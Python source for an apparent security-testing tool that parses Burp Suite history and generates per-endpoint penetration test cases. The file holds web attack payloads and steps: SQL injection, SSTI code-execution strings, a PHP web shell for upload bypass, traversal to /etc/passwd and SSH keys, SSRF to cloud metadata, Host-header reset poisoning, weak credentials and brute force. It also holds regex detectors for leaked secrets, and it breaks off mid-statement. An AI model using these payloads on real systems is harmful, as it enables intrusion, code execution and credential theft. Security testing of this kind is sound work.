"""
Burp Suite HTTP History Analyzer
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Parses Burp Suite XML history exports and generates targeted, context-aware
test cases based on discovered endpoints, parameters, auth mechanisms, and
response patterns.

Flow:
  1. Parse Burp XML  →  BurpItem[]
  2. Build profiles  →  EndpointProfile[] (grouped by normalised path)
  3. Response scan   →  direct findings (SQL errors, exposed secrets, etc.)
  4. Pattern engine  →  TestCase[] per endpoint (param + endpoint type matching)
  5. Claude AI       →  high-level insights streamed as SSE chunks
"""

from __future__ import annotations

import base64
import json
import pathlib
import re
import time as _time
import uuid
import xml.etree.ElementTree as ET
from collections import defaultdict
from dataclasses import dataclass, field
from typing import Any, AsyncGenerator, Optional
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

# ─── Attack Suite pattern library ────────────────────────────────────────────
# Re-use the same 5700+ bug-bounty patterns the scanner uses so payloads,
# parameter lists, and endpoint patterns stay in one place.
from app.api.v1.attack_patterns import (
    XSS_PAYLOADS, XSS_TEST_PARAMS, DOM_XSS_PAYLOADS, DOM_XSS_SINK_PARAMS,
    SQLI_ERROR_PAYLOADS, SQLI_TIME_PAYLOADS, SQLI_TEST_PARAMS,
    SSRF_PARAMS, SSRF_TARGETS, SSRF_BYPASS_ENCODINGS,
    IDOR_ID_PARAMS, IDOR_ENDPOINT_PATTERNS, IDOR_REST_PATHS,
    REDIRECT_PARAMS, REDIRECT_PAYLOADS,
    SSTI_PAYLOADS, SSTI_TEST_FIELDS,
    NOSQL_INJECTION_PAYLOADS, NOSQL_URL_PAYLOADS,
    XXE_PAYLOADS,
    FILE_UPLOAD_PATHS, FILE_UPLOAD_BYPASS_EXTENSIONS, FILE_UPLOAD_MALICIOUS_CONTENT,
    INFO_DISCLOSURE_PATHS,
    PRIV_ESC_PARAMS, PRIV_ESC_ADMIN_PATHS,
    MASS_ASSIGNMENT_ROLE_FIELDS,
    ATO_PASSWORD_RESET_TESTS, ATO_RESET_ENDPOINTS,
    WEAK_CREDENTIAL_PAIRS,
    JWT_WEAK_SECRETS, JWT_ALG_NONE_VARIANTS, JWT_KID_PAYLOADS,
    CSRF_SENSITIVE_ACTIONS, CSRF_BYPASS_HEADERS,
    PROTOTYPE_POLLUTION_PAYLOADS,
    BUSINESS_LOGIC_TESTS, BUSINESS_LOGIC_BASKET_ATTACKS,
    GRAPHQL_PATHS, GRAPHQL_INTROSPECTION, GRAPHQL_AUTH_BYPASS_QUERIES,
    CACHE_POISON_HEADERS, CACHE_POISON_VALUES,
    RACE_CONDITION_ENDPOINTS,
    COMMON_SENSITIVE_PATHS,
    TECH_SIGNATURES,
)

from fastapi import APIRouter as _APIRouter

from app.core.config import get_settings

_settings = get_settings()
router = _APIRouter(prefix="/burp", tags=["Burp Analyzer"])

# ─── Limits ───────────────────────────────────────────────────────────────────

MAX_FILE_BYTES = 500 * 1024 * 1024  # 500 MB
MAX_ITEMS      = 20_000             # max requests to parse
RESP_SCAN_LIMIT = 500               # max response bodies to scan (performance)
RESP_BODY_LIMIT = 64_000            # chars to scan per response body

# ─── Data classes ─────────────────────────────────────────────────────────────

@dataclass
class BurpItem:
    url: str
    host: str
    port: int
    protocol: str
    method: str
    path: str
    raw_request: str
    raw_response: str
    status_code: int
    response_length: int
    mimetype: str
    comment: str
    highlight: str
    # enriched
    query_params: dict[str, list[str]] = field(default_factory=dict)
    body_params: dict[str, list[str]] = field(default_factory=dict)
    json_body: Any = None
    req_headers: dict[str, str] = field(default_factory=dict)
    cookies: dict[str, str] = field(default_factory=dict)
    resp_headers: dict[str, str] = field(default_factory=dict)
    resp_body: str = ""
    has_file_upload: bool = False


@dataclass
class EndpointProfile:
    host: str
    method: str
    path: str          # normalised
    full_url: str
    all_params: set[str]
    auth_types: set[str]
    cookies: set[str]
    response_codes: set[int]
    response_types: set[str]
    has_file_upload: bool
    request_count: int
    is_json_api: bool


@dataclass
class TestCase:
    id: str
    endpoint: str
    method: str
    vuln_type: str
    title: str
    description: str
    parameters: list[str]
    payloads: list[str]
    severity: str
    priority: int
    cwe: str
    owasp: str
    rationale: str
    steps: list[str]


# ─── Endpoint classification ──────────────────────────────────────────────────

_EP_CLASSES: dict[str, dict] = {
    "auth": {
        "patterns": ["/login", "/signin", "/auth", "/oauth", "/sso", "/token", "/session", "/jwt"],
        "boost": 2,
    },
    "password": {
        "patterns": ["/forgot", "/reset-password", "/change-password", "/password-reset", "/recover"],
        "boost": 2,
    },
    "admin": {
        "patterns": ["/admin", "/manage", "/console", "/panel", "/internal", "/superuser", "/staff", "/backoffice"],
        "boost": 3,
    },
    "file_upload": {
        "patterns": ["/upload", "/attachment", "/import", "/avatar", "/photo", "/image", "/media"],
        "boost": 2,
    },
    "export": {
        "patterns": ["/export", "/download", "/report", "/csv", "/pdf", "/backup", "/dump"],
        "boost": 2,
    },
    "payment": {
        "patterns": ["/payment", "/checkout", "/order", "/cart", "/invoice", "/billing", "/purchase", "/subscription"],
        "boost": 3,
    },
    "debug": {
        "patterns": ["/debug", "/actuator", "/.env", "/.git", "/swagger", "/api-docs", "/phpinfo", "/info", "/trace", "/metrics"],
        "boost": 3,
    },
    "user_data": {
        "patterns": ["/user", "/users", "/account", "/profile", "/me/", "/member", "/customer"],
        "boost": 2,
    },
    "webhook": {
        "patterns": ["/webhook", "/callback", "/notify", "/hook", "/event"],
        "boost": 1,
    },
}

# ─── Parameter → vulnerability mapping ───────────────────────────────────────
# Payloads pulled directly from the attack_patterns library so both the live
# scanner and the Burp analyser always use the same up-to-date dataset.

def _ssrf_payload_list() -> list[str]:
    """Flatten SSRF_TARGETS into a plain list of URL strings."""
    return [t[0] for t in SSRF_TARGETS] + SSRF_BYPASS_ENCODINGS

def _nosql_payload_list() -> list[str]:
    return [str(p) for p in NOSQL_INJECTION_PAYLOADS] + NOSQL_URL_PAYLOADS

_PARAM_VULN_MAP: list[tuple[frozenset[str], dict]] = [
    (
        frozenset(p.lower() for p in IDOR_ID_PARAMS),
        {
            "vuln": "idor",
            "severity": "high",
            "title": "Insecure Direct Object Reference (IDOR)",
            "cwe": "CWE-639",
            "owasp": "API1:2023 - Broken Object Level Authorization",
            "description": "The endpoint exposes a direct reference to a server-side object. Substituting another user's identifier may allow unauthorised data access or modification.",
            "payloads": ["0", "1", "2", "3", "100", "-1", "99999", "me", "self", "admin", "null", "undefined"],
            "steps": [
                "Authenticate as User A — note the value of {param}",
                "In a separate session authenticate as User B — note their {param}",
                "While authenticated as User A, replace {param} with User B's value",
                "Verify whether User A can access / modify / delete User B's data",
                "Repeat without any Authorization header to test unauthenticated access",
                "Also test BOLA at path level: /api/resource/<user_b_id>",
            ],
        }
    ),
    (
        frozenset(p.lower() for p in SQLI_TEST_PARAMS),
        {
            "vuln": "sqli",
            "severity": "critical",
            "title": "SQL Injection",
            "cwe": "CWE-89",
            "owasp": "A03:2021 - Injection",
            "description": "Search, filter, sort, and ID parameters that interact with a database are prime SQL injection targets.",
            "payloads": SQLI_ERROR_PAYLOADS + SQLI_TIME_PAYLOADS,
            "steps": [
                "Send a single-quote (') in {param} — look for SQL errors in the response",
                "Check for: 'syntax error', 'ORA-', 'mysql_', 'SQLSTATE'",
                "Try time-based blind: ' OR SLEEP(5)-- (watch for ~5 s delay)",
                "If injectable, automate: sqlmap -u '{url}' -p {param} --dbs",
                "Also test JSON body keys and POST parameters with the same payloads",
            ],
        }
    ),
    (
        frozenset(p.lower() for p in REDIRECT_PARAMS),
        {
            "vuln": "open_redirect",
            "severity": "medium",
            "title": "Open Redirect",
            "cwe": "CWE-601",
            "owasp": "A01:2021 - Broken Access Control",
            "description": "URL redirection parameters can send users to attacker-controlled domains, enabling phishing and OAuth token theft.",
            "payloads": REDIRECT_PAYLOADS,
            "steps": [
                "Replace {param} with https://evil.example.com",
                "Follow the redirect — verify the browser lands on the attacker domain",
                "Try bypass variants: //evil.example.com  /\\evil.example.com",
                "For OAuth redirect_uri: append %2F%40evil.example.com",
                "Check whether the redirect fires before or after authentication",
            ],
        }
    ),
    (
        frozenset(p.lower() for p in SSRF_PARAMS),
        {
            "vuln": "ssrf",
            "severity": "high",
            "title": "Server-Side Request Forgery (SSRF)",
            "cwe": "CWE-918",
            "owasp": "A10:2021 - Server-Side Request Forgery",
            "description": "Parameters that accept URLs may cause the server to make outbound requests, exposing cloud metadata and internal services.",
            "payloads": _ssrf_payload_list(),
            "steps": [
                "Set up an OOB listener: Burp Collaborator or https://app.interactsh.com",
                "Replace {param} with your listener URL — confirm DNS/HTTP callback",
                "Try AWS metadata: http://169.254.169.254/latest/meta-data/",
                "Try GCP metadata: http://metadata.google.internal/computeMetadata/v1/",
                "Try internal services: 127.0.0.1:6379 (Redis)  127.0.0.1:9200 (Elasticsearch)",
                "Try IP bypass encodings: 0177.0.0.1 (octal)  2130706433 (decimal)  0x7f000001 (hex)",
            ],
        }
    ),
    (
        frozenset(["file", "path", "dir", "folder", "page", "template", "view",
                   "include", "filename", "document", "resource", "load", "read",
                   "filepath", "pathname", "attachment", "module", "layout"]),
        {
            "vuln": "path_traversal",
            "severity": "high",
            "title": "Path Traversal / Local File Inclusion",
            "cwe": "CWE-22",
            "owasp": "A01:2021 - Broken Access Control",
            "description": "File path parameters can be manipulated with directory traversal sequences to read arbitrary files from the server.",
            "payloads": [
                "../../../../etc/passwd",
                "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
                "....//....//....//etc/passwd",
                "%252e%252e%252fetc%252fpasswd",
                "..\\..\\..\\..\\windows\\win.ini",
                "/etc/passwd%00.jpg",
                "/proc/self/environ",
            ],
            "steps": [
                "Replace {param} with ../../../../etc/passwd",
                "Look for: root:x:0:0:root in the response",
                "Try URL-encoded variants to bypass filters",
                "On Windows targets: ..\\..\\windows\\win.ini",
                "Try double-encoding: ..%252f..%252fetc%252fpasswd",
                "Also probe: /proc/self/environ  /.ssh/id_rsa  /app/.env",
            ],
        }
    ),
    (
        frozenset(p.lower() for p in (XSS_TEST_PARAMS + SSTI_TEST_FIELDS)),
        {
            "vuln": "xss",
            "severity": "medium",
            "title": "Cross-Site Scripting (XSS)",
            "cwe": "CWE-79",
            "owasp": "A03:2021 - Injection",
            "description": "User-controlled text rendered in HTML without encoding allows script injection, enabling session hijacking and credential theft.",
            "payloads": XSS_PAYLOADS[:12] + DOM_XSS_PAYLOADS[:4],
            "steps": [
                "Submit <script>alert(1)</script> in the {param} field",
                "Navigate to where this value is displayed to other users",
                "If filtered, try: <img src=x onerror=alert(document.domain)>",
                "Check stored (persists across sessions) vs reflected (URL-only)",
                "Test DOM XSS: look for .innerHTML / document.write / eval() in JS",
                "Also check JSON responses consumed by client-side rendering frameworks",
            ],
        }
    ),
    (
        frozenset(p.lower() for p in SSTI_TEST_FIELDS) | frozenset(["template", "view", "render", "format", "style", "theme", "layout", "engine", "tpl", "tmpl", "skin"]),
        {
            "vuln": "ssti",
            "severity": "high",
            "title": "Server-Side Template Injection (SSTI)",
            "cwe": "CWE-94",
            "owasp": "A03:2021 - Injection",
            "description": "Template engine parameters can execute server-side expressions, potentially leading to Remote Code Execution.",
            "payloads": SSTI_PAYLOADS,
            "steps": [
                "Submit {{7*7}} in {param} — look for 49 in the response (SSTI confirmed)",
                "If {{7*'7'}} returns 7777777, it's Jinja2",
                "Identify the engine from error messages",
                "Jinja2 RCE: {{''.__class__.__mro__[1].__subclasses__()}}",
                "FreeMarker: <#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}",
                "Twig RCE: {{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
            ],
        }
    ),
    (
        frozenset(["price", "amount", "quantity", "qty", "cost", "total",
                   "discount", "coupon", "rate", "value", "units", "balance", "credits"]),
        {
            "vuln": "business_logic",
            "severity": "high",
            "title": "Business Logic — Price / Quantity Manipulation",
            "cwe": "CWE-840",
            "owasp": "A04:2021 - Insecure Design",
            "description": "Financial parameters trusted from the client side can be set to negative, zero, or astronomically large values to manipulate transactions.",
            "payloads": ["-1", "0", "0.001", "0.00", "-99.99", "9999999", "null", "1e99"]
                        + [str(t.get("quantity", "")) for t in BUSINESS_LOGIC_BASKET_ATTACKS if "quantity" in t],
            "steps": [
                "Set {param} to -1 and complete the transaction — check if balance increases",
                "Try 0.00 to acquire items for free",
                "Try extremely large values for integer overflow",
                "Intercept the response and modify the server-returned price before confirmation",
                "Remove {param} entirely — verify the server doesn't default to 0",
            ],
        }
    ),
    (
        frozenset(["email", "new_email", "user_email", "account_email"]),
        {
            "vuln": "account_takeover",
            "severity": "high",
            "title": "Account Takeover via Email Parameter",
            "cwe": "CWE-640",
            "owasp": "A07:2021 - Identification and Authentication Failures",
            "description": "Email parameters in password reset or email-change flows may be manipulated to reroute tokens to attacker-controlled addresses.",
            "payloads": [f"{list(t.keys())[0]}: {list(t.values())[0]}" for t in ATO_PASSWORD_RESET_TESTS[:6]],
            "steps": [
                "In the password-reset flow, set {param} to target a victim email",
                "Check if the reset link arrives at the attacker-controlled address",
                "Try HTTP Host header injection: change Host to attacker.com then trigger reset",
                "Try parameter pollution: send {param} twice (victim once, attacker once)",
                "Check the reset-link domain — does it use the Host header value?",
            ],
        }
    ),
    (
        frozenset(["q", "search", "find", "lookup", "filter"]),
        {
            "vuln": "nosql_injection",
            "severity": "high",
            "title": "NoSQL Injection",
            "cwe": "CWE-943",
            "owasp": "A03:2021 - Injection",
            "description": "Search parameters in NoSQL-backed APIs may accept MongoDB operators ($gt, $ne, $regex) that bypass authentication or return all records.",
            "payloads": _nosql_payload_list()[:10],
            "steps": [
                "Change {param}=value to {param}[$ne]=invalid — check if all records return",
                "Try {param}[$gt]= (empty string) — matches all documents",
                "Try {param}[$regex]=.* — wildcard match",
                "For JSON bodies: replace value with {\"$gt\": \"\"}",
                "Test login: set password[$ne]=invalid to bypass authentication",
            ],
        }
    ),
]

# ─── Response pattern scanning ────────────────────────────────────────────────

_RESPONSE_INDICATORS: list[dict] = [
    {
        "name": "SQL Error",
        "patterns": [
            r"ORA-\d{5}:", r"Microsoft OLE DB", r"You have an error in your SQL syntax",
            r"Warning: mysql_", r"pg_query\(\):", r"SQLite3::",
            r"Unclosed quotation mark", r"SQLSTATE\[",
            r"mysql_fetch_array\(\)", r"supplied argument is not a valid MySQL",
            r"SQL syntax.*MySQL", r"valid MySQL result",
        ],
        "vuln": "sqli", "severity": "critical",
        "title": "SQL Error in Response — Confirmed Injection Surface",
    },
    {
        "name": "Stack Trace",
        "patterns": [
            r"Traceback \(most recent call last\):",
            r"at .*\.(java|cs|php|rb|py):\d+",
            r"System\.Web\.HttpUnhandledException",
            r"NullPointerException",
            r"Unhandled Exception:",
            r"Fatal error:.*on line \d+",
            r"PHP Parse error:",
        ],
        "vuln": "info_disclosure", "severity": "medium",
        "title": "Stack Trace Exposed in Response",
    },
    {
        "name": "AWS Credentials",
        "patterns": [
            r"AKIA[0-9A-Z]{16}",
            r'"AccessKeyId"\s*:\s*"AKIA',
            r'"SecretAccessKey"\s*:\s*"[^"]{20,}"',
        ],
        "vuln": "secret_exposure", "severity": "critical",
        "title": "AWS Access Credentials in Response Body",
    },
    {
        "name": "Private Key",
        "patterns": [
            r"-----BEGIN (?:RSA |EC |OPENSSH )?PRIVATE KEY-----",
        ],
        "vuln": "secret_exposure", "severity": "critical",
        "title": "Private Cryptographic Key Exposed in Response",
    },
    {
        "name": "Sensitive JSON Fields",
        "patterns": [
            r'"password"\s*:\s*"[^"]{1,}"',
            r'"passwd"\s*:\s*"[^"]{1,}"',
            r'"secret_key"\s*:\s*"[^"]{8,}"',
            r'"api_key"\s*:\s*"[^"]{8,}"',
            r'"api_secret"\s*:\s*"[^"]{8,}"',
        ],
        "vuln": "info_disclosure", "severity": "high",
        "title": "Sensitive Fields in JSON Response",
    },
    {
        "name": "JWT in Response Body",
        "patterns": [r'eyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{5,}'],
        "vuln": "jwt_exposure", "severity": "medium",
        "title": "JWT Token Exposed in Response Body",
    },
    {
        "name": "Internal IP",
        "patterns": [
            r"\b10\.\d{1,3}\.\d{1,3}\.\d{1,3}\b",
            r"\b172\.(1[6-9]|2[0-9]|3[01])\.\d{1,3}\.\d{1,3}\b",
            r"\b192\.168\.\d{1,3}\.\d{1,3}\b",
            r"\b127\.\d{1,3}\.\d{1,3}\.\d{1,3}\b",
        ],
        "vuln": "info_disclosure", "severity": "info",
        "title": "Internal IP Address in Response",
    },
    {
        "name": "Debug Mode",
        "patterns": [
            r'"debug"\s*:\s*true',
            r'X-Debug-Token:',
            r'Symfony\s+Exception',
            r'Whoops\! There was an error\.',
            r'application_environment.*development',
        ],
        "vuln": "info_disclosure", "severity": "low",
        "title": "Debug Mode or Debug Info Active",
    },
    {
        "name": "Hardcoded Token",
        "patterns": [
            r'"(access_token|auth_token|bearer_token|id_token)"\s*:\s*"[A-Za-z0-9_\-\.]{20,}"',
        ],
        "vuln": "info_disclosure", "severity": "high",
        "title": "Auth Token Exposed in JSON Response",
    },
]

# ─── Tech stack fingerprinting ────────────────────────────────────────────────

_TECH_SIGNALS: dict[str, list[str]] = {
    "Django":       ["csrfmiddlewaretoken", "django", "csrftoken="],
    "Rails":        ["authenticity_token", "_rails", "Phusion Passenger"],
    "Laravel":      ["laravel_session", "XSRF-TOKEN"],
    "Spring Boot":  ["JSESSIONID", "/actuator", "X-Application-Context"],
    "Express/Node": ["express", "connect.sid", "x-powered-by: express"],
    "ASP.NET":      ["ASP.NET_SessionId", "__RequestVerificationToken", "X-AspNet-Version"],
    "PHP":          ["PHPSESSID", ".php", "X-Powered-By: PHP"],
    "WordPress":    ["wp-content", "wp-includes", "wp-json"],
    "GraphQL":      ["/graphql", "__typename", "operationName"],
    "JWT Auth":     ["Authorization: Bearer eyJ", "access_token", "refresh_token"],
    "AWS":          ["amazonaws.com", "X-Amzn-RequestId", "x-amz-"],
    "Next.js":      ["__NEXT_DATA__", "_next/static"],
    "React":        ["__react", "data-reactroot", "_reactFiber"],
    "Nginx":        ["server: nginx"],
    "Apache":       ["server: Apache"],
}

# ─── XML parser ───────────────────────────────────────────────────────────────

def _decode_burp_field(el: Optional[ET.Element]) -> str:
    if el is None:
        return ""
    text = el.text or ""
    if el.get("base64") == "true":
        try:
            return base64.b64decode(text.strip()).decode("utf-8", errors="replace")
        except Exception:
            return ""
    return text


def parse_burp_xml(content: bytes) -> list[BurpItem]:
    """
    Parse Burp Suite HTTP History XML export.
    Raises ValueError on malformed XML.
    Returns up to MAX_ITEMS BurpItem objects.
    """
    if len(content) > MAX_FILE_BYTES:
        raise ValueError(f"File too large — max {MAX_FILE_BYTES // 1024 // 1024} MB")

    try:
        root = ET.fromstring(content)
    except ET.ParseError as exc:
        raise ValueError(f"Invalid XML: {exc}") from exc

    items = []
    for el in root.findall("item")[:MAX_ITEMS]:
        try:
            item = _parse_item(el)
            if item:
                items.append(item)
        except Exception:
            continue

    return items


def _parse_item(el: ET.Element) -> Optional[BurpItem]:
    url       = (el.findtext("url") or "").strip()
    host      = (el.findtext("host") or "").strip()
    port      = int(el.findtext("port") or "443")
    protocol  = (el.findtext("protocol") or "https").strip()
    method    = (el.findtext("method") or "GET").strip().upper()
    path      = (el.findtext("path") or "/").strip()
    status    = int(el.findtext("status") or "0")
    resp_len  = int(el.findtext("responselength") or "0")
    mimetype  = (el.findtext("mimetype") or "").strip()
    comment   = (el.findtext("comment") or "").strip()
    highlight = (el.findtext("highlight") or "").strip()

    raw_req  = _decode_burp_field(el.find("request"))
    raw_resp = _decode_burp_field(el.find("response"))

    if not url and not host:
        return None

    item = BurpItem(
        url=url, host=host, port=port, protocol=protocol, method=method,
        path=path, raw_request=raw_req, raw_response=raw_resp,
        status_code=status, response_length=resp_len, mimetype=mimetype,
        comment=comment, highlight=highlight,
    )
    _enrich_item(item)
    return item


def _enrich_item(item: BurpItem) -> None:
    """Parse headers, params, cookies, and body from raw HTTP text."""
    if not item.raw_request:
        return

    # Split headers / body
    sep = "\r\n\r\n" if "\r\n\r\n" in item.raw_request else "\n\n"
    if sep in item.raw_request:
        header_block, _, body = item.raw_request.partition(sep)
    else:
        header_block, body = item.raw_request, ""

    # Request headers (skip first line = request line)
    for line in header_block.splitlines()[1:]:
        if ": " in line:
            k, _, v = line.partition(": ")
            item.req_headers[k.strip().lower()] = v.strip()

    # Cookies
    cookie_str = item.req_headers.get("cookie", "")
    for part in cookie_str.split(";"):
        part = part.strip()
        if "=" in part:
            k, _, v = part.partition("=")
            item.cookies[k.strip()] = v.strip()

    # Query params from URL
    try:
        parsed = urlparse(item.url)
        item.query_params = dict(parse_qs(parsed.query))
    except Exception:
        pass

    # Body params
    ct = item.req_headers.get("content-type", "").lower()
    body = body.strip()
    if body:
        if "application/x-www-form-urlencoded" in ct:
            item.body_params = dict(parse_qs(body))
        elif "application/json" in ct or body.startswith("{") or body.startswith("["):
            try:
                item.json_body = json.loads(body)
            except Exception:
                pass
        elif "multipart/form-data" in ct:
            item.has_file_upload = True

    # Response body (limited for performance)
    if item.raw_response:
        sep_r = "\r\n\r\n" if "\r\n\r\n" in item.raw_response else "\n\n"
        if sep_r in item.raw_response:
            resp_hdr_block, _, resp_body = item.raw_response.partition(sep_r)
            for line in resp_hdr_block.splitlines()[1:]:
                if ": " in line:
                    k, _, v = line.partition(": ")
                    item.resp_headers[k.strip().lower()] = v.strip()
            item.resp_body = resp_body[:RESP_BODY_LIMIT]
        else:
            item.resp_body = item.raw_response[:RESP_BODY_LIMIT]


# ─── Endpoint profiling ───────────────────────────────────────────────────────

_UUID_RE  = re.compile(r'[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}', re.I)
_LONG_ID  = re.compile(r'/\d{4,}')
_SHORT_ID = re.compile(r'(?<=/)\d{1,3}(?=/|$)')


def _normalise_path(path: str) -> str:
    path = _UUID_RE.sub("{uuid}", path)
    path = _LONG_ID.sub("/{id}", path)
    path = _SHORT_ID.sub("{id}", path)
    return path


def _flatten_json_keys(obj: Any, depth: int = 0) -> set[str]:
    keys: set[str] = set()
    if depth > 3:
        return keys
    if isinstance(obj, dict):
        for k, v in obj.items():
            keys.add(str(k))
            keys.update(_flatten_json_keys(v, depth + 1))
    elif isinstance(obj, list) and obj:
        keys.update(_flatten_json_keys(obj[0], depth + 1))
    return keys


def build_endpoint_profiles(items: list[BurpItem]) -> list[EndpointProfile]:
    groups: dict[tuple, list[BurpItem]] = defaultdict(list)
    for item in items:
        key = (item.host, item.method, _normalise_path(item.path))
        groups[key].append(item)

    profiles = []
    for (host, method, norm_path), group in groups.items():
        all_params: set[str] = set()
        auth_types: set[str] = set()
        cookies:    set[str] = set()
        resp_codes: set[int] = set()
        resp_types: set[str] = set()
        has_upload  = False
        is_json_api = False

        for item in group:
            all_params.update(item.query_params.keys())
            all_params.update(item.body_params.keys())
            if isinstance(item.json_body, dict):
                all_params.update(_flatten_json_keys(item.json_body))
                is_json_api = True
            if item.has_file_upload:
                has_upload = True

            auth_hdr = item.req_headers.get("authorization", "")
            if "bearer eyj" in auth_hdr.lower():
                auth_types.add("jwt")
            elif "bearer " in auth_hdr.lower():
                auth_types.add("bearer")
            elif "basic " in auth_hdr.lower():
                auth_types.add("basic")
            for h in ("x-api-key", "api-key", "x-auth-token", "x-access-token"):
                if h in item.req_headers:
                    auth_types.add("api_key")

            cookies.update(item.cookies.keys())
            if item.cookies:
                auth_types.add("cookie")

            resp_codes.add(item.status_code)
            ct = item.resp_headers.get("content-type", "")
            if "json" in ct:
                resp_types.add("json")
            elif "html" in ct:
                resp_types.add("html")
            elif "xml" in ct:
                resp_types.add("xml")

        rep = group[0]
        profiles.append(EndpointProfile(
            host=host,
            method=method,
            path=norm_path,
            full_url=f"{rep.protocol}://{host}{norm_path}",
            all_params=all_params,
            auth_types=auth_types,
            cookies=cookies,
            response_codes=resp_codes,
            response_types=resp_types,
            has_file_upload=has_upload,
            request_count=len(group),
            is_json_api=is_json_api,
        ))

    return profiles


# ─── Test case generator ──────────────────────────────────────────────────────

def generate_test_cases(profile: EndpointProfile) -> list[TestCase]:
    test_cases: list[TestCase] = []
    params_lower = {p.lower() for p in profile.all_params}
    path_lower   = profile.path.lower()

    # Endpoint class detection + priority boost
    ep_classes = []
    priority_base = 5
    for cls_name, cls_info in _EP_CLASSES.items():
        if any(pat in path_lower for pat in cls_info["patterns"]):
            ep_classes.append(cls_name)
            priority_base = min(10, priority_base + cls_info["boost"])

    seen_vulns: set[str] = set()

    # ── Parameter-based tests ────────────────────────────────────────────────
    for param_set, vuln_info in _PARAM_VULN_MAP:
        matching = [p for p in profile.all_params if p.lower() in param_set]
        if not matching:
            continue
        vtype = vuln_info["vuln"]
        if vtype in seen_vulns:
            continue
        seen_vulns.add(vtype)

        primary = matching[0]
        priority = min(10, priority_base + (2 if profile.method in ("POST", "PUT", "PATCH", "DELETE") else 0))

        steps = [
            s.replace("{param}", primary).replace("{url}", profile.full_url)
            for s in vuln_info["steps"]
        ]

        test_cases.append(TestCase(
            id=str(uuid.uuid4())[:8],
            endpoint=f"{profile.method} {profile.full_url}",
            method=profile.method,
            vuln_type=vtype,
            title=vuln_info["title"],
            description=vuln_info["description"],
            parameters=matching[:4],
            payloads=vuln_info["payloads"],
            severity=vuln_info["severity"],
            priority=priority,
            cwe=vuln_info["cwe"],
            owasp=vuln_info["owasp"],
            rationale=(
                f"Parameter(s) '{', '.join(matching[:3])}' at {profile.method} {profile.path} "
                f"match known {vtype.upper()} patterns."
            ),
            steps=steps,
        ))

    # ── Endpoint-class tests ──────────────────────────────────────────────────
    if "auth" in ep_classes and "brute_force" not in seen_vulns:
        seen_vulns.add("brute_force")
        test_cases.append(TestCase(
            id=str(uuid.uuid4())[:8],
            endpoint=f"{profile.method} {profile.full_url}",
            method=profile.method,
            vuln_type="brute_force",
            title="Authentication — Rate Limiting / Account Lockout",
            description="Login endpoints without rate-limiting or lockout policies allow brute-force attacks.",
            parameters=list(profile.all_params)[:3],
            payloads=[f"{u}:{p}" for u, p in WEAK_CREDENTIAL_PAIRS[:12]],
            severity="high", priority=8,
            cwe="CWE-307", owasp="A07:2021 - Identification and Authentication Failures",
            rationale=f"Authentication endpoint detected at {profile.path}.",
            steps=[
                "Send 20+ rapid login attempts with wrong credentials",
                "Check if the server responds with 429 after N attempts",
                "Verify whether accounts lock after repeated failures",
                "Test for username enumeration: compare error messages for valid vs invalid usernames",
                "Run Burp Intruder / hydra with a common password list",
            ],
        ))

    if "admin" in ep_classes and "auth_bypass" not in seen_vulns:
        seen_vulns.add("auth_bypass")
        test_cases.append(TestCase(
            id=str(uuid.uuid4())[:8],
            endpoint=f"{profile.method} {profile.full_url}",
            method=profile.method,
            vuln_type="auth_bypass",
            title="Admin Endpoint — Access Control Bypass",
            description="Admin panels must enforce strict authorisation. Headers like X-Original-URL and X-Forwarded-For can sometimes bypass controls.",
            parameters=[],
            payloads=["X-Original-URL: /admin", "X-Forwarded-For: 127.0.0.1", "X-Custom-IP-Authorization: 127.0.0.1"],
            severity="critical", priority=10,
            cwe="CWE-284", owasp="A01:2021 - Broken Access Control",
            rationale=f"Admin/privileged endpoint detected at {profile.path}.",
            steps=[
                "Access as a low-privilege user — verify 403 or 404",
                "Remove the Authorization header entirely",
                "Add: X-Original-URL: /admin  or  X-Forwarded-For: 127.0.0.1",
                "Try path normalisation bypass: /user/../admin  /app/./admin",
                "Try HTTP verb tampering: HEAD, OPTIONS, TRACE",
            ],
        ))

    if ("file_upload" in ep_classes or profile.has_file_upload) and "file_upload" not in seen_vulns:
        seen_vulns.add("file_upload")
        test_cases.append(TestCase(
            id=str(uuid.uuid4())[:8],
            endpoint=f"{profile.method} {profile.full_url}",
            method=profile.method,
            vuln_type="file_upload",
            title="Unrestricted File Upload",
            description="File upload endpoints may accept dangerous file types (PHP, JSP) or allow path traversal in filenames.",
            parameters=["file", "upload", "attachment"],
            payloads=(
                [f"shell{ext}  →  <?php system($_GET['cmd']); ?>" for ext in FILE_UPLOAD_BYPASS_EXTENSIONS[:6]]
                + [v.decode() if isinstance(v, bytes) else v for v in list(FILE_UPLOAD_MALICIOUS_CONTENT.values())[:3]]
            ),
            severity="critical", priority=10,
            cwe="CWE-434", owasp="A04:2021 - Insecure Design",
            rationale=f"File upload endpoint or multipart/form-data request detected at {profile.path}.",
            steps=[
                "Upload a .php file with: <?php system($_GET['cmd']); ?>",
                "If rejected, try: shell.PHP  shell.php%00.jpg  shell.phtml",
                "Change Content-Type to image/jpeg while keeping .php extension",
                "Try path traversal in filename: ../../webroot/shell.php",
                "Check if uploaded files are stored in a web-accessible directory",
            ],
        ))

    if "debug" in ep_classes and "info_disclosure" not in seen_vulns:
        seen_vulns.add("info_disclosure")
        test_cases.append(TestCase(
            id=str(uuid.uuid4())[:8],
            endpoint=f"{profile.method} {profile.full_url}",
            method=profile.method,
            vuln_type="info_disclosure",
            title="Debug / Development Endpoint Exposed",
            description="Debug endpoints expose config, env vars, heap dumps, or source code. Should never be reachable in production.",
            parameters=[],
            payloads=[],
            severity="high", priority=9,
            cwe="CWE-215", owasp="A05:2021 - Security Misconfiguration",
            rationale=f"Debug or development endpoint detected at {profile.path}.",
            steps=[
                "Access without authentication — check for env vars or config",
                "For Spring Actuator: try /actuator/env  /actuator/heapdump  /actuator/mappings",
                "For /.git/config: verify no source code exposure",
                "For /.env: check for hardcoded secrets / credentials",
                "For /swagger or /api-docs: enumerate all undocumented endpoints",
            ],
        ))

    if "jwt" in profile.auth_types and "jwt_attack" not in seen_vulns:
        seen_vulns.add("jwt_attack")
        test_cases.append(TestCase(
            id=str(uuid.uuid4())[:8],
